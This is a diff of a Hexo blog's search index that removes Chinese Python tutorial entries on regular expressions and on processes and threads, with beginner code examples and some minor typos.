@@ -1,85 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>12.字符串和正则表达式</title>
-    <url>/2020/02/13/12-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">正则表达式30分钟入门</a><br><span id="more"></span><br>|符号|解释|事例|说明|<br>|—-|——|—-|——|<br>|.|匹配任意字符|b.t|可以匹配bat/but/b#t/b1t等|<br>|\w|匹配字母/数字/下划线|b\wt|可以匹配bat/b1t/b_t等，但不能匹配b#t|<br>|\s|匹配空白字符（包括\r、\n、\t等）|love\syou|可以匹配love you|<br>|\d|匹配数字|\d\d|可以匹配01/23/99等|<br>|^|匹配字符串的开始|^The|可以匹配The开头的字符串|<br>|$|匹配字符串的结束|.exe$|可以匹配.exe结尾的字符串|<br>|\W|匹配非字母/数字/下划线|b\Wt|可以匹配b#t/b@t等 但不能匹配but/b1t/b_t等|<br>|\S|匹配非空白字符|love\Syou|可以匹配Love#you等 但不能匹配love you等|<br>|\D|匹配非数字|\d\D|可以匹配9a/3#/0Fd等|<br>|\B|匹配非单词边界|\Bio\B||<br>|[]| 匹配来自字符集的任意单一字符 | [aeoou]|可以匹配任一原因字母字符|<br>|<sup><a href="#fn_" id="reffn_"></a></sup>|匹配不在字符集中的任意单一字符|<sup><a href="#fn_aeiou" id="reffn_aeiou">aeiou</a></sup>|可以匹配任一非元音字母字符|<br>|<em> | 匹配0次或多次|\W</em>||<br>|+|匹配1次或多次|\W+||<br>|?|匹配0次或1次|\W?||<br>|{N}|匹配N次|\w{3}|<br>|{M,}|匹配至少M次|\w{3,}||<br>|{M,N}|匹配至少M次至多N次|\w{3,6}||<br>| | |分支|foo | bar|可以匹配foo或者bar|<br>|(?#)|注释|||<br>|(exp)|匹配exp并捕获到自动命名的组中|||<br>|(?\<name\>exp)|匹配exp并捕获到名为name的组中|||<br>|(?:exp)|匹配exp但是不捕获匹配的文本|||<br>|(?=exp)|匹配exp前面的位置|\b\w(?=ing)|可以匹配I’m dancing中的danc|<br>|(?&lt;=exp)|匹配exp后面的位置|(?&lt;=\bdanc)\w+\b|可以匹配I love dancing and reading中的第一个ing|<br>|(?!exp)|匹配后面不是exp的位置|||<br>|(?&lt;!exp)|匹配前面不是exp的位置|||<br>|<em>?|重复任意次，但尽可能少重复|a.</em>b a.*?b|将正则表达式应用与aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串|<br>|+?|重复1次或多次，但尽可能少重复|||<br>|??|重复0次或1次，但尽可能少重复|||<br>|{M,N}?|重复M到N次，但尽可能少重复|||<br>|{M,}?|重复M次以上，但尽可能少重复|||</name\></p>
-<blockquote>
-<p>说明：如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\进行转义处理，例如想匹配小数点可以写成.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成(和)，否则圆括号被视为正则表达式中的分组。</p>
-</blockquote>
-<h2 id="Python对正则表达式的支持"><a href="#Python对正则表达式的支持" class="headerlink" title="Python对正则表达式的支持"></a>Python对正则表达式的支持</h2><p>Python提供了re模块来支持正则表达式相关操作，下面时re模块中的核心函数</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>函数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>conpile(pattern,flags=0)</td>
-<td>编译正则表达式返回正则表达式对象</td>
-</tr>
-<tr>
-<td>match(pattern,string,flags=0)</td>
-<td>用正则表达式匹配字符串 成功返回匹配对象 否则返回None</td>
-</tr>
-<tr>
-<td>search(pattern,string,flags=0)</td>
-<td>搜索字符串中第一次出现正则表达式的模块 成功返回匹配对象 否则返回None</td>
-</tr>
-<tr>
-<td>split(pattern,string,maxsplit=0,flags=0)</td>
-<td>用正则表达式指定的模块分隔符拆分字符串 返回列表</td>
-</tr>
-<tr>
-<td>sub(pattern,repl,string,count=0,flags=0)</td>
-<td>用指定的字符串替换元字符串中与正则表达式匹配的模式 可以用count指定替换的次数</td>
-</tr>
-<tr>
-<td>fullmatch(pattern,string,flags=0)</td>
-<td>match函数的完全匹配（从字符串开始到结尾）版本</td>
-</tr>
-<tr>
-<td>findall(pattern,string,flags=0)</td>
-<td>查找字符串所有与正则表达式匹配的模式 返回字符串的列表</td>
-</tr>
-<tr>
-<td>finditer(pattern,string,flags=0)</td>
-<td>查找字符串所有与正则表达式匹配的模式 返回一个迭代器</td>
-</tr>
-<tr>
-<td>purge()</td>
-<td>清除隐式编译的正则表达式的缓存</td>
-</tr>
-<tr>
-<td>re.l/re.IGNORECASE</td>
-<td>忽略大小写匹配标记</td>
-</tr>
-<tr>
-<td>re.M/re.MULTILINE</td>
-<td>多行匹配标记</td>
-</tr>
-</tbody>
-</table>
-</div>
-<blockquote>
-<p>说明： 上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。</p>
-</blockquote>
-<h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><p>验证输入用户名和qq号是否有效并给出对应的提示信息<br>要求：用户名必须由字母、数字或下划线构成且长度在6-20个字符之间，qq号是5-12的数字且首位不能为0<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">    qq = <span class="built_in">input</span>(<span class="string">&#x27;请输入qq号：&#x27;</span>)</span><br><span class="line">    <span class="comment"># match函数的第一个参数是正则表达式字符串或正则表达式对象</span></span><br><span class="line">    <span class="comment"># 第二个参数是要跟正则表达式做匹配的字符串对象</span></span><br><span class="line">    m1 = re.match(<span class="string">r&#x27;^[0-9a-z-A-Z_]&#123;6,20&#125;$&#x27;</span>,username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请输入有效的用户名.&#x27;</span>)</span><br><span class="line">    m2 = re.match(<span class="string">r&#x27;^[1-9]\d&#123;4,11&#125;$&#x27;</span>,qq)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请输入有效的QQ号.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> m1 <span class="keyword">and</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;你输入的信息是有效的！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>提示： 上面在书写正则表达式时使用了“原始字符串”的写法（在字符串前面加上了r），<br>所谓“原始字符串”就是字符串中的每个字符都是它原始的意义，说得更直接一点就是字符串中没有所谓的转义字符啦。<br>因为正则表达式中有很多元字符和需要进行转义的地方，如果不使用原始字符串就需要将反斜杠写作\\，<br>例如表示数字的\d得书写成\\d，这样不仅写起来不方便，阅读的时候也会很吃力。</p>
-</blockquote>
-<h3 id="例2：从一段文字中提取出国内手机号码"><a href="#例2：从一段文字中提取出国内手机号码" class="headerlink" title="例2：从一段文字中提取出国内手机号码"></a>例2：从一段文字中提取出国内手机号码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建正则表达式对象 使用了前瞻和回顾来保证手机号前后不应该出现数字</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=\D)1[34578]\d&#123;9&#125;(?=\D)&#x27;</span>)</span><br><span class="line">    sentence = <span class="string">&#x27;重要的事情说8130123456789遍，我的手机号是13512346789这个靓号，不是15600998765，也是110或119，王大锤的手机号才是15600998765。&#x27;</span></span><br><span class="line">    <span class="comment"># 查找所有匹配并保存到一个列表中</span></span><br><span class="line">    mylist = re.findall(pattern,sentence)</span><br><span class="line">    <span class="built_in">print</span>(mylist)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------华丽的分割线--------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 通过迭代器取出匹配对象并获得匹配的内容</span></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> pattern.finditer(sentence):</span><br><span class="line">        <span class="built_in">print</span>(temp.group())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------华丽的分割线--------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 通过search函数指定搜索位置找出所有的匹配</span></span><br><span class="line">    m = pattern.search(sentence)</span><br><span class="line">    <span class="keyword">while</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m.group())</span><br><span class="line">        m = pattern.search(sentence,m.end())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h3 id="例3-替换字符串中的不良内容"><a href="#例3-替换字符串中的不良内容" class="headerlink" title="例3 替换字符串中的不良内容"></a>例3 替换字符串中的不良内容</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def <span class="selector-tag">main</span>():</span><br><span class="line">    sentence = <span class="string">&#x27;你丫是傻叉吗？我操你大爷的.Fuck you.&#x27;</span></span><br><span class="line">    purified = re.<span class="built_in">sub</span>(<span class="string">&#x27;[操肏艹]|fuck|shit|傻[比屄逼叉缺吊屌]|煞笔&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,sentence,flags=re.IGNORECASE)</span><br><span class="line">    <span class="built_in">print</span>(purified)</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure>
-<h3 id="例4：拆分长字符串"><a href="#例4：拆分长字符串" class="headerlink" title="例4：拆分长字符串"></a>例4：拆分长字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    poem = <span class="string">&#x27;窗前明月光，疑是地上霜。举头望明月，低头思故乡。&#x27;</span></span><br><span class="line">    sentence_list = re.split(<span class="string">r&#x27;[,。，.]&#x27;</span>,poem)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> sentence_list:</span><br><span class="line">        sentence_list.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sentence_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Python-100days</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>11.文件和异常</title>
     <url>/2020/02/12/11-%E6%96%87%E4%BB%B6%E5%92%8C%E5%BC%82%E5%B8%B8/</url>
     <content><![CDATA[<h2 id="11-文件和异常"><a href="#11-文件和异常" class="headerlink" title="11.文件和异常"></a><strong>11.文件和异常</strong></h2><p>在Python中实现文件的读写操作通过内置的open函数，我们可以指定文件名、操作模式、编码信息等来获得操作文件的对象，接下来就可以对文件进行读写操作了。</p>
@@ -207,20 +128,79 @@
       </tags>
   </entry>
   <entry>
-    <title>13.进程和线程</title>
-    <url>/2020/02/18/13.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>进程就是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间，每个进程都有自己的地址空间、数据栈以及其他用于跟踪进程执行的辅助数据，操作系统管理所有进程的执行，为它们合理的分配资源。进程可以通过fork或spawn的方式来创建新的进程来执行其他的任务，不过新的进程也有自己独立的内存空间，因此必须通过进程间通信机制（IPC，Inter-Process Communication）来实现数据共享，具体的方式包括管道、信号、套接字、共享内存区等。<br>一个进程还可以拥有多个并发的执行线索，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程在同一个进程下，它们可以共享相同的上下文，因此对于进程而言，线程间的信息共享和通信更加容易。当然在单核DDPU系统中，真正的并发是不可能的，因为<strong>在某个时刻能够获得CPU的只有唯一的一个线程，多个线程共享了CPU的执行时间</strong>。使用多线程实现并发编程为程序带来的好处是不言而喻的，最主要的体现是提升程序的性能和改善用户体验。<br><span id="more"></span></p>
-<h2 id="Python中的多进程"><a href="#Python中的多进程" class="headerlink" title="Python中的多进程"></a>Python中的多进程</h2><p>Unix和Linux操作系统上提供了fork()系统调用来创建进程，调用fork()函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。fork()函数非常特殊，它会返回两次，父进程中可以通过fork()函数的返回值得到子进程的PID，而子进程中的返回值永远都是0.Python的OS模块提供了fork()函数。由于Windows系统没有fork()调用，因此要实现跨平台的多进程编程，可以使用multiprocessing模块的Process类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（Pool）、用于进程间通信的队列（Queue）和管道（Pipe）等。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download_task(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费了%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">download_task</span>(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>)</span><br><span class="line">    <span class="built_in">download_task</span>(<span class="string">&#x27;Peking Hot.avi&#x27;</span>)</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>这个例子可以得出，如果程序中的代码只能按顺序一点点的往下执行，那么即使执行两个互不相关的下载任务，也需要先等待一个文件下载完成后才能开始下一个下载任务。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> multiprocessing import Process</span><br><span class="line"><span class="selector-tag">from</span> os import getpgid</span><br><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download_task(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;启动下载进程，进程号[%d].&#x27;</span> % <span class="built_in">getpid</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费了%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    p1 = <span class="built_in">Process</span>(target=download_task,args=(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>))</span><br><span class="line">    p1.<span class="built_in">start</span>()</span><br><span class="line">    p2 = <span class="built_in">Process</span>(target=download_task,args=(<span class="string">&#x27;Peking Hot.avi&#x27;</span>))</span><br><span class="line">    p2.<span class="built_in">start</span>()</span><br><span class="line">    p1.<span class="built_in">join</span>()</span><br><span class="line">    p2.<span class="built_in">join</span>()</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>上面通过Process类创建了进程对象，通过target参数传入一个函数表示进程启动后要执行的代码，后面args是一个元祖，代表传递给函数的参数。Process和start方法用来启动进程，而join方法表示等待进程执行结束。两个任务同时启动了。</p>
-<p>也可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通讯</p>
-<h2 id="Python中的多线程"><a href="#Python中的多线程" class="headerlink" title="Python中的多线程"></a>Python中的多线程</h2><p>Python通过thread模块（现在名为_thread）来实现多线程编程，该模块过于底层，而且很多功能都没有提供，推荐threading模块，该模块对多线程编程提供了更好的面对对象的封装。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> threading import Thread</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    t1 = <span class="built_in">Thread</span>(target=download,args=(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>))</span><br><span class="line">    t1.<span class="built_in">start</span>()</span><br><span class="line">    t2 = <span class="built_in">Thread</span>(target=download,args=(<span class="string">&#x27;Peking Hot.avi&#x27;</span>,))</span><br><span class="line">    t2.<span class="built_in">start</span>()</span><br><span class="line">    t1.<span class="built_in">join</span>()</span><br><span class="line">    t2.<span class="built_in">join</span>()</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.3f秒&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>直接使用threading模块的Thread类来创建进程，但是我们之前讲过一个非常重要的概念叫“继承”，我们可以从已有的类创建类，因此可以通过继承Thread类的方式来创建自定义的线程类，然后再创建线程对象并启动线程。<br><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="title">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="title">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">DownloadTask</span>(<span class="type">Thread</span>):</span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">filename</span>):</span></span><br><span class="line"><span class="class">        super().__init__()</span></span><br><span class="line"><span class="class">        self._filename = filename</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        print(&#x27;开始下载%<span class="title">s</span>...&#x27; % <span class="title">self</span>.<span class="title">_filename</span>)</span></span><br><span class="line"><span class="class">        time_to_download = randint(5,10)</span></span><br><span class="line"><span class="class">        sleep(<span class="title">time_to_download</span>)</span></span><br><span class="line"><span class="class">        print(&#x27;%<span class="title">s</span>下载完成！耗费%<span class="title">d</span>秒&#x27; % (<span class="title">self</span>.<span class="title">_filename</span>,<span class="title">time_to_download</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def main():</span></span><br><span class="line"><span class="class">    start = time()</span></span><br><span class="line"><span class="class">    t1 = <span class="type">DownloadTask</span>(&#x27;<span class="type">Python</span>从入门到住院.<span class="title">pdf&#x27;</span>)</span></span><br><span class="line"><span class="class">    t1.start()</span></span><br><span class="line"><span class="class">    t2 = <span class="type">DownloadTask</span>(&#x27;<span class="type">Peking</span> <span class="type">Hot</span>.<span class="title">avi&#x27;</span>)</span></span><br><span class="line"><span class="class">    t2.start()</span></span><br><span class="line"><span class="class">    t1.join()</span></span><br><span class="line"><span class="class">    t2.join()</span></span><br><span class="line"><span class="class">    end = time()</span></span><br><span class="line"><span class="class">    print(&#x27;总共耗费了%.2<span class="title">f</span>秒&#x27; % (<span class="title">end</span>-<span class="title">start</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="class">    main()</span></span><br></pre></td></tr></table></figure><br>多个线程可以共享进程的内存空间，要实现多个线程间的通信相对简单，设置一个全局变量，多个线程共享这个全局变量即可。但是当多个线程共享同一个变量（称之为资源）的时候，很有可能产生不可控的结果导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，通常称之为“临界资源”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”状态。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Account</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._balance = <span class="number">0</span></span><br><span class="line">        self._lock = Lock() <span class="comment">#加锁保护对银行账户的操作</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">self,money</span>):</span></span><br><span class="line">        self._lock.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 计算存款后的余额</span></span><br><span class="line">            new_balance = self._balance + money</span><br><span class="line">            <span class="comment"># 模拟受理存款业务需要0.01秒的时间</span></span><br><span class="line">            sleep(<span class="number">0.01</span>)</span><br><span class="line">            <span class="comment"># 修改账户余额</span></span><br><span class="line">            self._balance = new_balance</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># 在finally中执行释放锁的操作保证正常异常锁都能释放</span></span><br><span class="line">            self._lock.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">balance</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._balance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddMoneyThread</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,account,money</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self._account = account</span><br><span class="line">        self._money = money</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._account.deposit(self._money)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    account = Account()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="comment"># 创建100个存款的线程向同一个账户存钱</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        t = AddMoneyThread(account,<span class="number">1</span>)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="comment"># 等所有存款的线程都执行完毕</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;账户余额为：￥%d元&#x27;</span> % account.balance)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
-<h2 id="多进程还是多线程"><a href="#多进程还是多线程" class="headerlink" title="多进程还是多线程"></a>多进程还是多线程</h2><p>无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型。如果你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以旁观者的角度来看，你就正在同时写5科作业。</p>
-<p>但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。所以，多任务一旦多到一个限度，反而会使得系统性能急剧下降，最终导致所有任务都做不好。</p>
-<p>是否采用多任务的第二个考虑是任务的类型，可以把任务分为计算密集型和I/O密集型。计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如对视频进行编码解码或者格式转换等等，这种任务全靠CPU的运算能力，虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低。计算密集型任务由于主要消耗CPU资源，这类任务用Python这样的脚本语言去执行效率通常很低，最能胜任这类任务的是C语言，我们之前提到了Python中有嵌入C/C++代码的机制。</p>
-<p>除了计算密集型任务，其他的涉及到网络、存储介质I/O的任务都可以视为I/O密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待I/O操作完成（因为I/O的速度远远低于CPU和内存的速度）。对于I/O密集型任务，如果启动多任务，就可以减少I/O等待时间从而让CPU高效率的运转。</p>
-<h2 id="单线程-异步I-O"><a href="#单线程-异步I-O" class="headerlink" title="单线程+异步I/O"></a>单线程+异步I/O</h2><p>现代操作系统对I/O操作的改进中最为重要的就是支持异步I/O。如果充分利用操作系统提供的异步I/O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I/O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。</p>
-<p>在Python语言中，单线程+异步I/O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。</p>
-<h3 id="例1：将耗时间的任务放到线程中以获得更好的用户体验"><a href="#例1：将耗时间的任务放到线程中以获得更好的用户体验" class="headerlink" title="例1：将耗时间的任务放到线程中以获得更好的用户体验"></a>例1：将耗时间的任务放到线程中以获得更好的用户体验</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">import <span class="selector-tag">time</span></span><br><span class="line">import tkinter</span><br><span class="line">import tkinter<span class="selector-class">.messagebox</span></span><br><span class="line"><span class="selector-tag">from</span> threading import Thread</span><br><span class="line"></span><br><span class="line">def <span class="selector-tag">main</span>():</span><br><span class="line">    class <span class="built_in">DownloadTaskHandler</span>(Thread):</span><br><span class="line">        def <span class="built_in">run</span>(self):</span><br><span class="line">            time.<span class="built_in">sleep</span>(<span class="number">10</span>)</span><br><span class="line">            tkinter.messagebox.<span class="built_in">showinfo</span>(<span class="string">&#x27;提示&#x27;</span>,<span class="string">&#x27;下载完成！&#x27;</span>)</span><br><span class="line">            # 启用下载按钮</span><br><span class="line">            button1.<span class="built_in">config</span>(state = tkinter.NORMAL)</span><br><span class="line">    def <span class="built_in">download</span>():</span><br><span class="line">        # 禁用下载按钮</span><br><span class="line">        button1.<span class="built_in">config</span>(state = tkinter.DISABLED)</span><br><span class="line">        # 